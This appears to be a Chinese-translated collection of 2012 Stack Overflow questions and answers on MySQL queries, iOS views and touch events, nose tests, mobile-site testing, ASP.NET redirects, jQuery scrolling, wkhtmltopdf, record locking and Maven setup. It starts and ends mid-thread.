> 时间：2012-09-14T15:40:17.953

以下查询将第二个查询放在 WHERE 子句中进行比较：

```
SELECT phone
FROM civicrm_phone phone
LEFT JOIN civicrm_participant participant ON phone.contact_id = participant.contact_id
WHERE phone.is_primary = 1
AND participant.id IS NULL and
    not exists (SELECT 1
                FROM civicrm_phone phone2
                LEFT JOIN civicrm_participant participant ON phone2.contact_id = participant.contact_id
                WHERE phone.is_primary = 1
                      AND participant.id IS NULL
                      and phone2.phone = phone.phone
              ) 
```

通常在 SQL 中，您会为此使用 NOT IN，但带有相关子查询的 NOT EXISTS 在 MySQL 中更有效。

# objective-c - ViewController 只调用一次 touchesMoved

> ID：12427733
> 
> 赞同：2
> 
> 时间：2012-09-14T15:37:10.200
> 
> 标签：objective-c, ios, uiview, uiviewcontroller, viewcontroller

我有一个问题，我已经搜索过但找不到明确的答案。这是我的布局：

```
UIView - ViewController   
   |_UIScrollView - added programatically
      | |_UIView to hold a backgound/perimeter  - added programmatically
      |_UIView 1 - added programmatically
      |_UIView 2 - added programmatically
       and so on 
```

我的问题是当我在触摸时移动说 UIView 2 时，ViewController 为何只调用一次“touchesMoved”？

现在 UIView 有它自己的 touchesMoved 方法，但我需要控制器的 touchesMoved 被调用，因为我需要它与 ScrollView 对话以更新其位置。比如当那个 UIView 2 靠近拐角时，让 ScrollView 稍微移动一点以完全显示 UIView 2。

如果没有办法解决这个问题，有没有办法从 UIView 2 更新 ScrollView 以在靠近角落时滚动？

编辑：

我想我可能已经找到了解决办法。不确定这是否会被 Apple 接受，但是：

我刚刚调用了一个实例变量，即 = self.superview，然后我可以在 UIView 的 touchesMoved 中与我的 ScrollView 对话

因为我可以调用方法 [ScrollView setContentOffset:(CGPoint)contentOffset animated:(BOOL)animated] 所以当子视图（UIView2）靠近 UIWindow 的边缘时，我的 ScrollView 会得到更新。

感谢您的建议。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T16:04:20.480

您描述的行为是`UIScrollView`劫持触摸移动事件的结果。换句话说，一旦`UIScrollView`检测到触摸移动事件落在其框架内，它就会控制它。我在尝试创建一个特殊的滑动处理程序时遇到了同样的行为，并且每次 a`UIScrollView`也对滑动感兴趣时它都会失败。

就我而言，我通过`sendEvent:`在我的 custom中拦截事件来解决这个问题`UIWindow`，但我不知道你是否想这样做。无论如何，这对我有用：

```
- (void)sendEvent:(UIEvent*)event {
NSSet* allTouches = [event allTouches];
UITouch* touch = [allTouches anyObject];
UIView* touchView = [touch view];

//-- UIScrollViews will make touchView be nil after a few UITouchPhaseMoved events;
//-- by storing the initialView getting the touch, we can overcome this problem
if (!touchView && _initialView && touch.phase != UITouchPhaseBegan)
    touchView = _initialView;

    //-- do your own management of the event

    //-- let the event propagate if you want also the default event management
[super sendEvent:event];

} 
```

您可能会研究的另一种方法是将*手势识别*器附加到您的视图 - 它们具有相当高的优先级，因此 UIScrollView 可能不会与它们混淆，它可能对您更有效。

> 如果没有办法解决这个问题，有没有办法从 UIView 2 更新 ScrollView 以在靠近角落时滚动？

您是否尝试`UIScrollView`通过调用来滚动：

```
- (void)setContentOffset:(CGPoint)contentOffset animated:(BOOL)animated 
```

# python - 如何为所有鼻子测试定义一个设置函数？

> ID：12427734
> 
> 赞同：4
> 
> 时间：2012-09-14T15:37:09.130
> 
> 标签：python, nosetests

我正在使用带有 python 的谷歌应用引擎，并希望使用nosetest 运行一些测试。我希望每个测试都运行相同的设置功能。我已经有很多测试了，所以我不想通过它们并复制和粘贴相同的功能。我可以在某个地方定义一个设置函数，并且每个测试都会先运行它吗？

谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-14T16:44:11.573

您可以编写设置函数并使用`with_setup`装饰器应用它：

```
from nose.tools import with_setup

def my_setup():
   ...

@with_setup(my_setup)
def test_one():
    ...

@with_setup(my_setup)
def test_two():
    ... 
```

如果您想对多个测试用例使用相同的设置，您可以使用类似的方法。首先创建 setup 函数，然后使用装饰器将其应用于所有 TestCases：

```
def my_setup(self):
    #do the setup for the test-case

def apply_setup(setup_func):
    def wrap(cls):
        cls.setup = setup_func
        return cls
    return wrap

@apply_setup(my_setup)
class MyTestCaseOne(unittest.TestCase):
    def test_one(self):
        ...
    def test_two(self):
        ...

@apply_setup(my_setup)
class MyTestCaseTwo(unittest.TestCase):
    def test_one(self):
        ... 
```

或者另一种方法可能是简单地分配您的设置：

```
class MyTestCaseOne(unittest.TestCase):
    setup = my_setup 
```

# testing - 在桌面浏览器中测试移动网站

> ID：12427736
> 
> 赞同：13
> 
> 时间：2012-09-14T15:37:14.110
> 
> 标签：testing, mobile, jquery-mobile

我正在使用 jQuery Mobile 为 iPhone、Android 等开发一个移动网站。我希望能够在我的桌面浏览器中对此进行测试，并且想知道最好的方法是什么。我想我可以使用插件将 User-Agent 标头更改为适当的值并手动将浏览器调整为设备的宽度，但是有没有更简单/更可靠的方法？

## 更新

抱歉，我应该提到唯一可用的硬件是 Windows 笔记本电脑

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-14T16:01:17.510

好吧，如果你有一台 Mac 并安装了 xCode，你可以使用模拟器。在所有 Apple 设备上打开 Mobile Safari 并指向您的网页

你也可以使用安卓模拟器（但我没有测试过它可以从浏览器访问网络）

或者，您可以使用插件（如您所建议的那样）。

我个人使用 Chrome 和这个插件：

*   [https://chrome.google.com/webstore/detail/ljfpjnehmoiabkefmnjegmpdddgcdnpo](https://chrome.google.com/webstore/detail/ljfpjnehmoiabkefmnjegmpdddgcdnpo)

效果不错。

我以前用过 Device Anywhere

*   [http://www.keynotedeviceanywhere.com/](http://www.keynotedeviceanywhere.com/)

您通过门户网站/网站访问设备并对其进行控制，但这需要花费 $$$$

实际设备测试将是最可靠的

有关的：

*   [http://sixrevisions.com/tools/10-excellent-tools-for-testing-your-site-on-mobile-devices/](http://sixrevisions.com/tools/10-excellent-tools-for-testing-your-site-on-mobile-devices/)（其他建议）
*   [iPhone模拟器和Android模拟器之间的区别](https://stackoverflow.com/questions/4544588/difference-between-iphone-simulator-and-android-emulator)

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2017-01-27T08:27:37.340

在 Chrome 中按 F12 打开开发者工具栏。然后单击“切换设备工具栏”（平板电脑图标，选择元素旁边的左上角）。然后，您可以选择顶部的设备进行测试。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-18T10:39:03.817

还有用于远程测试设备的 PerfectoMobile……尽管它可能会非常缓慢。如果可能的话，我真的建议至少获得一些“基础”测试设备。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2015-09-11T07:12:18.277

还有[http://www.browserstack.com/responsive](http://www.browserstack.com/responsive)可用于获取您的网站在许多给定设备上的样子的屏幕截图。

但是，在我在这里链接到的免费版本中，您可以获得多少屏幕截图是有限制的。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2017-07-03T17:57:45.663

**通过使用名为Ripple Beta**的 Chrome 插件，我在视觉上得到了很好的结果。不好的是，无法添加一些自定义设备，例如 8 英寸或 9 英寸或更大的平板电脑……但可以。我不确定它是否能够在真实设备上显示一些可见的错误，但看起来不错。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-10-29T02:07:23.160

[Manymo](https://www.manymo.com/)应该可以很好地为您模拟 Android。它准确地向我显示了我的手机显示的内容，即使我的桌面浏览器没有。Manymo 是一个有很多安卓手机的网站。只需单击一个并输入您的 URL。有Android版本和屏幕尺寸等选项。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2015-06-01T12:37:26.873

寻找 Chrome 插件[Responsive Web Design Tester](http://responsivewebdesigntester.com/) - 您将能够在所有平台上模拟不同设备尺寸的移动浏览器。

# asp.net - .aspx 向控制器操作的页面请求

> ID：12427738
> 
> 赞同：-1
> 
> 时间：2012-09-14T15:37:20.187
> 
> 标签：asp.net, asp.net-mvc-3, redirect, routing, asp.net-mvc-routing

我有 asp.net webform 网站，我已将其迁移到 asp.net mvc。

现在我想为我的旧 .aspx 页面请求执行 301 永久重定向到 asp.net mvc 控制器操作。

有人可以详细解释我如何将 .aspx 页面请求重定向到 asp.net mvc 控制器/操作。

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T15:41:25.730

最简单的方法就是调用：

```
Response.RedirectPermanent(newUrl); 
```

这将向浏览器发送 301。

编辑：所以看起来您已经删除了 ASPX 页面，因此物理页面不再存在，导致 404。您仍然可以通过将处理此问题的代码放在 Global.asax 中来解决这个问题，例如：

```
protected void Application_BeginRequest(object sender, EventArgs e)
{
    if (Request.Url.AbsolutePath == "/SomePage.aspx")
    {
        Response.RedirectPermanent("~/SomePage");
    }
} 
```

# jquery - 来自 jQuery Animate 的奇怪行为

> ID：12427740
> 
> 赞同：0
> 
> 时间：2012-09-14T15:37:29.640
> 
> 标签：jquery, jquery-ui

我将 jQuery 的 animate() 函数与 jQuery UI 插件中的缓动结合使用，以动画方式通过侧边栏中的链接向下滚动我的页面。我还用它来操作“返回顶部”按钮。你可以在这里看到它：[http ://www.element17.com/](http://www.element17.com/)

返回顶部按钮工作正常，但链接的行为不稳定。有时效果很好，有时它要么拒绝滚动，等待一两秒钟然后滚动，要么根本没有动画，只是跳下页面，就好像它们一开始没有编写脚本一样。

这是返回顶部按钮的代码：

```
$('#go_up').click(function(){
  $('#main').animate({scrollTop:0}, 2000, 'easeOutExpo');
}); 
```

这是链接的代码：

```
$('.scroll').click(function(){
  $('#main').animate({scrollTop:$(this.hash).offset().top}, 3000, 'easeOutExpo');
}); 
```

我已经在 OSX 和 Windows 的 Chrome 中对此进行了测试，但两者的行为都不稳定。谁能建议为什么会这样？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-15T00:25:28.223

首先，您需要防止哈希链接 ( `return false`) 的默认行为，进一步您需要检查是否存在具有给定 id 的元素。

```
$('a[href*=#]').on('click', function() {
    var hash = $(this.hash).offset();
    if (hash) {
        $('#main').stop().animate({
            scrollTop: hash.top
        }, 3000, 'easeOutExpo');
        return false;
    }
}); 
```

**更新** 将您的链接和 ID 更改为有效的：

*   #EN%20FLEURS -> #EN_FLEURS
*   #WWPW%202011 -> #WWPW_2011
*   #MUSEÉ%20DU%20LOUVRE -> #MUSEE_DU_LOUVRE
*   #FAIRYTALE%20ROAD -> #FAIRYTALE_ROAD

**顺便一提**

如果不需要（例如在页面顶部）隐藏滚动到顶部的链接，请使用：

```
$(window).scroll(function () {
    if ($(this).scrollTop() !== 0) {
        $('#go_up').fadeOut();
    } else {
        $('#go_up').fadeIn();
    }
}); 
```

用css隐藏它：

```
#go_up {display:none} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-15T00:16:30.297

您`$(this.hash).offset().top`并不总是提供您期望的值，即来自`#main`div 的顶部。如果您滚动到页面底部并点击底部的链接，`offset().top`它将在屏幕上是相对的，而不是绝对的。例如，可能是负值。但是，animate 的 scrollTop 需要绝对滚动位置。

一种解决方案可能是

```
$('#main').animate({scrollTop:
       $(this.hash).offset().top - $('#CONSTRUCTS').offset().top},
   3000, 'easeOutExpo'); 
```

where`#CONSTRUCTS`将作为最顶层的元素。

根据数据的动态程度，您可能希望将其替换为 #main 左上角的任何内容。

还有很多其他方法可以解决它。

# javascript - HTML/CSS 到 PDF，所有页面上的背景图像

> ID：12427741
> 
> 赞同：6
> 
> 时间：2012-09-14T15:37:32.270
> 
> 标签：javascript, css, pdf-generation, wkhtmltopdf

我正在从用户提交的 HTML/CSS 生成 PDF。客户已要求 PDF 具有背景图像以添加一些品牌。PDF 库是 wkhtmltopdf11RC1。

我可以使用 PDF 转换库使图像在后台打印，但真正的问题是正文的高度不能保证是纸张高度的倍数，所以最后一页通常会被切断，背景图像未显示。

PDF 库确实有 javascript 支持，但`element.offsetHeight`似乎并不准确，因此我无法检查要填充多少内容才能制作一整页。

有没有人有类似的经历或者有没有人有一个好主意？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-08T08:45:47.970

不幸`var currentBodyHeight = $('body').height();`的是，由于某种原因，它没有给出准确的身体高度指示，如原始帖子中所述。我按照 Nenotlep 的建议使用了 PDFtk。

这并不太棘手，只需要确保文件被正确保存和擦除，并且我总是保留对临时文件的引用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T17:37:34.123

如果插件依赖于身体的高度来做出打印决定，那么这可能会起作用。它所做的是将正文的高度设置为页面高度的倍数。您将不得不弄清楚纸张高度是多少 - 标准是每英寸 72 像素。所以 11.5 英寸相当于 841 像素，但您可能需要调整边距。

```
var paperHeight = 841;

var currentDocHeight = $(document).height();

var pages = Math.ceil(currentDocHeight / paperHeight);

var newBodyHeight = pages * paperHeight;

$('body').css('height', newBodyHeight); 
```

我已经使用 jQuery 来压缩答案，但这也可以在没有 jQuery 的 javascript 中完成。

CSS：

```
body {
  margin:0
} 
```

# c# - 处理 winform 应用程序中的意外事件

> ID：12427742
> 
> 赞同：2
> 
> 时间：2012-09-14T15:37:33.557
> 
> 标签：c#, .net, winforms, sql-server-2008

我有一个`win-form`在 .net 4.0 中开发并使用`SQL 2008`as的应用程序`DBMS`。

用户可以从项目列表中打开一个项目，每次打开时，我都会使用***userId***更新数据库，以说明特定项目是由特定用户打开的，因此其他用户无法同时打开同一个项目。此外，当用户关闭该项目时，我会将其重置为其他人可以打开的正常状态。

但是我想知道如果某些系统崩溃/卡住或类似情况如何更新数据库。有没有什么好的解决方案来处理这些情况？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T15:44:05.597

一种解决方案是将时间戳列添加到数据表中。每次用户访问一个项目（除了其他工作）您设置此时间戳值。

然后，您可以有一个单独的任务/服务来迭代记录并偶尔释放任何过期的锁。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T15:45:17.983

So you're trying to implement your own [locking](http://en.wikipedia.org/wiki/Lock_%28computer_science%29) mechanism. See how to mitigate the problems of [Deadlocking](http://en.wikipedia.org/wiki/Deadlock) that should give you an idea. Basically either you use notifications or stamps to track lock's owner status (if it's dead or still using the resource), preventing [resource starvation](http://en.wikipedia.org/wiki/Resource_starvation).

**Requested example**

There are 2 users. User A and User B.

User A open a view within your app, then two things happen:

*   You update the DB and set the stamp to the current time.
*   You start a new background thread who will be responsible to mantain the lock. This background thread must wait N-Delta where N is the maximum minutes the resource can be locked without renew and delta is the delta for update time. So, for example, suppose a view can be locked for maximum 15 minutes without user activity, then your thread must wait 15-1 (taking that will probably take 1 minute to notify DB "better be caution with this time").

Then User B try to access to that view, you check on the db for the resource and for the lock table and if there's a lock on that view whose time isn't superior from 15 minutes then you deny access. BUT if time is most that 15 minutes you grant the access to the User B and remove the access from the User A.

If either User A or User B successfully close the view, then you just remove the entrance from the DB.

This is a very simple example but should give you an idea of what I mean.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-14T15:52:40.907

我以前也遇到过类似的情况。在这种情况下，您将不得不假设用户对该项目采取行动的最长时间（例如 15 分钟）。创建一个名为 item_lock 的表，其中包含 2 列：item_id、lock_aquired_time。每次用户单击任何项​​目时，都会在此表中插入一条记录。如果任何其他用户尝试打开该项目.. 将在他的屏幕上弹出一条通知，说明该资源已被 XYZ 锁定以执行操作。此外，您将需要创建一个每分钟运行一次的服务，并将删除任何超过 15 分钟的记录。
PS：每当任何用户完成对任何项目的操作时..该行将从 item_lock 表中删除。

# iphone - 按下按钮后显示图像

> ID：12427745
> 
> 赞同：1
> 
> 时间：2012-09-14T15:37:43.683
> 
> 标签：iphone, ios, xcode, uiviewcontroller, uiimage

我正在尝试更改背景颜色并在按下按钮时使图像出现在屏幕上。我可以改变颜色，但无法显示图像的痕迹。我也不知道如何将图像放在屏幕上。我正在使用 iOS 5 和情节提要，但我没有将 UIImageView 添加到情节提要中，因为我希望它出现。

我的 ViewController.h

```
#import <UIKit/UIKit.h>

@interface ViewController : UIViewController
- (IBAction)changeButton:(id)sender;

@end 
```

我的 ViewController.m

```
#import "ViewController.h"

@interface ViewController ()

@end

@implementation ViewController

- (void)viewDidLoad
{
    [super viewDidLoad];
    // Do any additional setup after loading the view, typically from a nib.

}

- (void)didReceiveMemoryWarning
{
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}

-(void)colorchange
{
   self.view.backgroundColor = [UIColor greenColor];
}

-(void)imageShow
{
    UIImage *image = [UIImage imageNamed:@"logo-tag-centered.pmg"];
    UIImageView *imgView = [[UIImageView alloc] initWithFrame:CGRectMake(0, 0, 0, 0)];
    [imgView setImage:image];

}

- (IBAction)changeButton:(id)sender
{
    [self colorchange];
    [self imageShow];

}
@end 
```

任何帮助将不胜感激！谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T15:41:00.453

您必须将图像视图添加到视图控制器的视图中。

```
- (void)showImage
{
    UIImage *image = [UIImage imageNamed:@"logo-tag-centered.png"];
    UIImageView *imgView = [[UIImageView alloc] initWithImage:image];
    imgView.center = CGPointMake(self.view.bounds.size.width / 2.0f, self.view.bounds.size.height / 2.0f);
    [self.view addSubview:imgView];
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T15:42:25.693

您尚未将图像视图添加到主视图的任何位置。你可以这样做：

```
- (void)viewDidLoad
{
    [super viewDidLoad];
    UIImage *image = [UIImage imageNamed:@"logo-tag-centered.pmg"];
    UIImageView *imgView = [[UIImageView alloc] initWithFrame:CGRectMake(0, 0, 0, 0)];
    [imgView setImage:image];
    [imgView setHidden:YES];
    [self.view addSubview:imgView];
}
-(void)imageShow
{
    [imgView setHidden:NO];
}
- (IBAction)changeButton:(id)sender
{
    [self colorchange];
    [self imageShow];
} 
```

# ios - 对 iOS 应用程序的验证和 Ad-Hoc 分发的困惑

> ID：12427746
> 
> 赞同：0
> 
> 时间：2012-09-14T15:37:48.783
> 
> 标签：ios, xcode, app-store, app-store-connect, ad-hoc-distribution

作为我的理学硕士项目的一部分，我已经为 iPhone 创建了我的第一个 iOS 应用程序

我不想将其上传到 App Store，而是将其转换为考官可以用来在他们自己的设备上检查我的应用的文件。

因此我需要保存我的应用程序`Ad-Hoc deployment`

我创建了我的 Xcode 项目的存档，然后按照Apple 建议的[这些步骤进行操作](http://developer.apple.com/library/ios/#recipes/xcode_help-archives_organizer/articles/distributing_ios_apps.html#//apple_ref/doc/uid/TP40010547-CH2-SW1)

`myProject.ipa`在我的硬盘上创建了一个文件。这够了吗 ？这就是我需要发送给考官以便他们可以在自己的 iPhone 上安装应用程序的全部内容吗？

**因为，** 我注意到存档管理器`Validate`中的按钮顶部还有一个`Distribute`按钮（我只是按下它来创建文件）`.ipa`

所以我回到**存档管理器**，再次选择我的存档并点击`Validate`，我得到了：

> 没有找到申请记录
> 
> 应用程序必须准备好上传到 iTunes Connect，然后才能在 Xcode 中进行验证或提交。

我去了我的 iTunes Connect 帐户，它显然是空的，即我没有向 AppStore 提交任何应用程序。但我仍然想验证我的应用程序，然后再将其发送给审查员以查看它是否符合所有要求（即使它现在在我自己的设备上运行良好——只是为了确定）。

那么上面的消息是什么意思呢？我是否必须将我的应用程序提交到 iTunes 连接（即 AppStore）才能对其进行验证？

此外，*作为 Ad-Hoc 分发的一部分，是否应该首先验证应用程序才能在其他设备上运行？*

在此先感谢您的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T16:02:30.833

验证仅适用于您将应用提交到 App Store 时。您收到“未找到应用程序记录”消息的原因是因为要提交到 App Store，您实际上必须首先在 iTunes Connect 中创建应用程序提交并输入所有元数据。

XCode 查询该记录，以便它可以关联您正在构建的项目。

对于 Ad-Hoc 分发，您需要确保将审查员设备添加到您在创建存档时使用的分发配置文件中。然后，您只需给他们 .ipa，他们就可以通过 iTunes 安装。

# java - 安装 DBPedia 提取框架

> ID：12427748
> 
> 赞同：1
> 
> 时间：2012-09-14T15:38:08.820
> 
> 标签：java, dbpedia, information-extraction

我正在尝试按照[http://wiki.dbpedia.org/Documentation安装 DBPedia 提取框架](http://wiki.dbpedia.org/Documentation)

我已经下载了 Maven 二进制版本。

```
$ mvn --version
Apache Maven 3.0.4 (r1232337; 2012-01-17 16:44:56+0800)
Maven home: /home/william/universe/Downloads/apache-maven-3.0.4
Java version: 1.5.0, vendor: Free Software Foundation, Inc.
Java home: /usr/lib64/jvm/java-1.5.0-gcj-4.6-1.5.0.0/jre
Default locale: en_US, platform encoding: UTF-8
OS name: "linux", version: "3.1.0-1.2-desktop", arch: "x86_64", family: "unix" 
```

在提取目录时，我尝试运行它进行安装，但出现错误。

```
dell:/home/william/Downloads/extraction_framework # mvn install
Sep 14, 2012 11:36:08 p.m. com.google.inject.internal.MessageProcessor visit
INFO: An exception was caught and reported. Message: java.util.NoSuchElementException
java.util.NoSuchElementException
   at java.util.AbstractList$2.next(libgcj.so.12)
   at com.google.inject.spi.InjectionPoint.forMember(InjectionPoint.java:116)
   at com.google.inject.spi.InjectionPoint.<init>(InjectionPoint.java:73)
   at com.google.inject.spi.InjectionPoint$InjectableMethod.toInjectionPoint(InjectionPoint.java:459)
   at com.google.inject.spi.InjectionPoint.getInjectionPoints(InjectionPoint.java:725)
   at com.google.inject.spi.InjectionPoint.forInstanceMethodsAndFields(InjectionPoint.java:358)
   at com.google.inject.spi.InjectionPoint.forInstanceMethodsAndFields(InjectionPoint.java:377)
   at com.google.inject.internal.BindingBuilder.toInstance(BindingBuilder.java:84)
   at org.codehaus.plexus.DefaultPlexusContainer$ContainerModule.configure(DefaultPlexusContainer.java:803)
   at com.google.inject.spi.Elements$RecordingBinder.install(Elements.java:229)
   at com.google.inject.spi.Elements.getElements(Elements.java:103)
   at com.google.inject.spi.Elements.getElements(Elements.java:80)
   at org.sonatype.guice.bean.binders.MergedModule.configure(MergedModule.java:54)
   at com.google.inject.spi.Elements$RecordingBinder.install(Elements.java:229)
   at com.google.inject.spi.Elements.getElements(Elements.java:103)
   at com.google.inject.internal.InjectorShell$Builder.build(InjectorShell.java:136)
   at com.google.inject.internal.InternalInjectorCreator.build(InternalInjectorCreator.java:104)
   at com.google.inject.Guice.createInjector(Guice.java:94)
   at com.google.inject.Guice.createInjector(Guice.java:71)
   at com.google.inject.Guice.createInjector(Guice.java:61)
   at org.codehaus.plexus.DefaultPlexusContainer.addPlexusInjector(DefaultPlexusContainer.java:470)
   at org.codehaus.plexus.DefaultPlexusContainer.<init>(DefaultPlexusContainer.java:196)
   at org.codehaus.plexus.DefaultPlexusContainer.<init>(DefaultPlexusContainer.java:160)
   at org.apache.maven.cli.MavenCli.container(MavenCli.java:375)
   at org.apache.maven.cli.MavenCli.doMain(MavenCli.java:191)
   at org.apache.maven.cli.MavenCli.main(MavenCli.java:141)
   at java.lang.reflect.Method.invoke(libgcj.so.12)
   at org.codehaus.plexus.classworlds.launcher.Launcher.launchEnhanced(Launcher.java:290)
   at org.codehaus.plexus.classworlds.launcher.Launcher.launch(Launcher.java:230)
   at org.codehaus.plexus.classworlds.launcher.Launcher.mainWithExitCode(Launcher.java:409)
   at org.codehaus.plexus.classworlds.launcher.Launcher.main(Launcher.java:352)
Sep 14, 2012 11:36:08 p.m. com.google.inject.internal.MessageProcessor visit
INFO: An exception was caught and reported. Message: java.util.NoSuchElementException
java.util.NoSuchElementException
   at java.util.AbstractList$2.next(libgcj.so.12)
   at com.google.inject.spi.InjectionPoint.forMember(InjectionPoint.java:116)
   at com.google.inject.spi.InjectionPoint.<init>(InjectionPoint.java:73)
   at com.google.inject.spi.InjectionPoint$InjectableMethod.toInjectionPoint(InjectionPoint.java:459)
   at com.google.inject.spi.InjectionPoint.getInjectionPoints(InjectionPoint.java:725)
   at com.google.inject.spi.InjectionPoint.forInstanceMethodsAndFields(InjectionPoint.java:358)
   at com.google.inject.spi.InjectionPoint.forInstanceMethodsAndFields(InjectionPoint.java:377)
   at com.google.inject.internal.BindingBuilder.toInstance(BindingBuilder.java:84)
   at org.codehaus.plexus.DefaultPlexusContainer$DefaultsModule.configure(DefaultPlexusContainer.java:836)
   at com.google.inject.spi.Elements$RecordingBinder.install(Elements.java:229)
   at com.google.inject.spi.Elements.getElements(Elements.java:103)
   at com.google.inject.spi.Elements.getElements(Elements.java:80)
   at org.sonatype.guice.bean.binders.MergedModule.configure(MergedModule.java:54)
   at com.google.inject.spi.Elements$RecordingBinder.install(Elements.java:229)
   at com.google.inject.spi.Elements.getElements(Elements.java:103)
   at com.google.inject.internal.InjectorShell$Builder.build(InjectorShell.java:136)
   at com.google.inject.internal.InternalInjectorCreator.build(InternalInjectorCreator.java:104)
   at com.google.inject.Guice.createInjector(Guice.java:94)
   at com.google.inject.Guice.createInjector(Guice.java:71)
   at com.google.inject.Guice.createInjector(Guice.java:61)
   at org.codehaus.plexus.DefaultPlexusContainer.addPlexusInjector(DefaultPlexusContainer.java:470)
   at org.codehaus.plexus.DefaultPlexusContainer.<init>(DefaultPlexusContainer.java:196)
   at org.codehaus.plexus.DefaultPlexusContainer.<init>(DefaultPlexusContainer.java:160)
   at org.apache.maven.cli.MavenCli.container(MavenCli.java:375)
   at org.apache.maven.cli.MavenCli.doMain(MavenCli.java:191)
   at org.apache.maven.cli.MavenCli.main(MavenCli.java:141)
   at java.lang.reflect.Method.invoke(libgcj.so.12)
   at org.codehaus.plexus.classworlds.launcher.Launcher.launchEnhanced(Launcher.java:290)
   at org.codehaus.plexus.classworlds.launcher.Launcher.launch(Launcher.java:230)
   at org.codehaus.plexus.classworlds.launcher.Launcher.mainWithExitCode(Launcher.java:409)
   at org.codehaus.plexus.classworlds.launcher.Launcher.main(Launcher.java:352)
[ERROR] Error executing Maven.
[ERROR] null 
```

知道怎么了？谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T16:35:15.273

我搞定了，JAVA_HOME 应该指向 JDK，

JAVA_HOME 应该是

```
export JAVA_HOME=/usr/java/jdk1.7.0_02/ 
```

代替

```
/usr/lib64/jvm/java-1.5.0-gcj-4.6-1.5.0.0/jre 
```

# mysql - MYSQL 语法错误 LEFT JOIN

> ID：12427750
> 
> 赞同：1
> 
> 时间：2012-09-14T15:38:28.287
> 
> 标签：mysql, sql

我在试图找出这个语法错误时遇到问题。下面是 SQL 查询：

## SQL查询

```
SELECT oh.date_modified, oh.physicianNote, os.name AS status
FROM order oh 
LEFT JOIN order_status os ON oh.order_status_id = os.order_status_id
WHERE oh.order_id = '118' AND os.language_id = '1'
ORDER BY oh.date_added ASC LIMIT 0,10 
```

## SQL 错误

> 1064 - 您的 SQL 语法有错误；检查与您的 MySQL 服务器版本相对应的手册，以在第 2 行的“order oh LEFT JOIN order_status os ON oh.order_status_id = os.order_status_i”附近使用正确的语法

不太确定它有什么问题。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-14T15:39:47.020

`ORDER`是一个[保留字](http://dev.mysql.com/doc/en/reserved-words.html)。用反引号引用它：

```
SELECT   oh.date_modified, oh.physicianNote, os.name AS status
FROM     `order` oh LEFT JOIN order_status os USING (order_status_id)
WHERE    oh.order_id = '118' AND os.language_id = '1'
ORDER BY oh.date_added
LIMIT    0,10 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T15:40:18.703

**“ORDER”**是保留字。这是错误。在反引号中使用单词**顺序引用**

# uiview - UIView 在导航过渡结束之前出现

> ID：12427752
> 
> 赞同：0
> 
> 时间：2012-09-14T15:38:30.170
> 
> 标签：uiview, uinavigationcontroller, toolbar, transition

我正在编写一个带有导航控制器内表格的 iPhone 应用程序。当用户单击主屏幕中的一个单元格时，会在传入的视图控制器顶部创建一个 UIView（它就像一个工具栏）。

```
self.toolbar = [[UIView alloc] initWithFrame:CGRectMake(0, 0, 320, 45)];
toolbar.backgroundColor = [UIColor colorWithRed:0.8823 green:0.8823 blue:0.8823 alpha:1.0]; 
[self.navigationController.view addSubview:toolbar]; 
```

问题是视图在转换到新视图控制器完成之前出现，效果很奇怪。我想这是因为我将视图添加到导航控制器，但我需要这样做，否则栏会与表格一起滚动，而我希望它被修复。

有什么建议吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T16:42:46.100

我找到了一个可能的解决方案：将工具栏添加为 TableHeaderView 并按照[iOS：将 UIView 添加到 UITableView](https://stackoverflow.com/questions/9265058/ios-add-uiview-to-uitableview)

任何其他更好的解决方案都非常受欢迎

# php - 提前玩简单的 PHP Dom 解析器

> ID：12427753
> 
> 赞同：0
> 
> 时间：2012-09-14T15:38:30.780
> 
> 标签：php, parsing, dom

我想用[PHP Simple HTML DOM Parser](http://simplehtmldom.sourceforge.net)做一些高级的事情，但不明白怎么做..

我想做的：假设我们从这里得到一些 url

```
foreach($result->find('a') as $element)
$element->href 
```

现在我想将其内容作为纯文本获取，但请注意我将从该页面获取完整内容。

假设这个脚本有一个名为的变量`$sn = 'linkin park song';`- 有没有办法从那些具有关键字的页面中获取行`$sn`

如果你不明白我想要做什么，那么这里是一个例子。

假设`$sn = 'Google 2012 Earning Report';`PHP SIMPLE DOM PARSER 将从中获取一些 url `$element->href`，例如：

```
http://www.dailytech.com/Google+Q2+2012+Earnings+Rise+11+Percent+Deals+with+Falling+Ad+PricesMotorola+Issues/article25221.htm 
```

它将从此 url 获取纯文本，匹配`$sn`：

```
Google's Q2 2012 earning are looking good despite certain issues ...
Google's latest Earning Report is result of its ability to better target... 
```

# java - xjc 类型定义名称解析错误

> ID：12427756
> 
> 赞同：2
> 
> 时间：2012-09-14T15:38:34.857
> 
> 标签：java, xsd, jaxb, xjc, xml-binding

当我想用 XJC 编译我的 XSD（我不是它的作者）时，我遇到了麻烦。

具体来说，我得到了错误（实际上还有更多类似的错误）：

```
 [ERROR] src-resolve: Cannot resolve the name "ifopt:CountryRefStructure" to a(n) 'type definition' component.
